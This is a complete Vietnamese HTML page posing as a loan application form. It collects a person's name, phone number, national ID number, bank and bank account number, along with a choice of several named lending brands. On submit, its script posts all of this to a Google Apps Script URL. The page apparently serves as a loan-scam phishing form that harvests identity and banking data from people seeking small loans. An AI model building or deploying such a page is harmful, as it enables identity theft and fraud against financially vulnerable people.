<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Đăng ký vay tiền</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body{
      font-family: Arial;
      background:#f2f2f2;
      margin:0;
      padding:15px;
    }
    .box{
      background:white;
      padding:15px;
      border-radius:10px;
      box-shadow:0 0 10px rgba(0,0,0,0.1);
    }
    h2{
      text-align:center;
      color:#e53935;
    }
    input, select{
      width:100%;
      padding:10px;
      margin-top:8px;
      margin-bottom:12px;
      border-radius:6px;
      border:1px solid #ccc;
      font-size:16px;
    }
    button{
      width:100%;
      padding:12px;
      background:#e53935;
      color:white;
      border:none;
      border-radius:8px;
      font-size:18px;
    }
  </style>
</head>
<body>

<div class="box">
  <h2>ĐĂNG KÝ HỒ SƠ VAY</h2>

  <input id="name" placeholder="Họ và tên">
  <input id="phone" placeholder="Số điện thoại">
  <input id="cccd" placeholder="Số CCCD">

  <select id="bank">
    <option value="">Chọn ngân hàng</option>
    <option>Vietcombank</option>
    <option>BIDV</option>
    <option>MB Bank</option>
    <option>ACB</option>
    <option>Techcombank</option>
  </select>

  <input id="account" placeholder="Số tài khoản ngân hàng">

  <select id="amount">
    <option value="">Chọn số tiền vay</option>
    <option>500,000</option>
    <option>1,000,000</option>
    <option>2,000,000</option>
    <option>4,000,000</option>
    <option>8,000,000</option>
    <option>12,000,000</option>
    <option>30,000,000</option>
    <option>50,000,000</option>
  </select>

  <select id="company">
    <option value="">Chọn công ty vay</option>
    <option>MoneyCat</option>
    <option>Robocash</option>
    <option>OnCredit</option>
    <option>Cash24</option>
    <option>Doctor Đồng</option>
  </select>

  <button onclick="submitForm()">GỬI HỒ SƠ</button>
</div>

<script>
function submitForm() {

  const data = {
    name: document.getElementById("name").value,
    phone: document.getElementById("phone").value,
    cccd: document.getElementById("cccd").value,
    bank: document.getElementById("bank").value,
    account: document.getElementById("account").value,
    amount: document.getElementById("amount").value,
    company: document.getElementById("company").value
  };

  // kiểm tra trống
  for (let key in data) {
    if (!data[key]) {
      alert("Vui lòng nhập đầy đủ thông tin!");
      return;
    }
  }

  fetch("https://script.google.com/macros/s/AKfycbykU-3b8odtLHN34odOJ8RftZw7b3Rcu5EvVWNuTthSlsWgnx928bC3RmgawHtJGsXL/exec", {
    method: "POST",
    body: JSON.stringify(data)
  })
  .then(res => res.text())
  .then(() => {
    alert("Gửi hồ sơ thành công!");
    document.querySelectorAll("input, select").forEach(el => el.value = "");
  })
  .catch(err => {
    alert("Lỗi gửi hồ sơ!");
    console.log(err);
  });
}
</script>

</body>
</html>
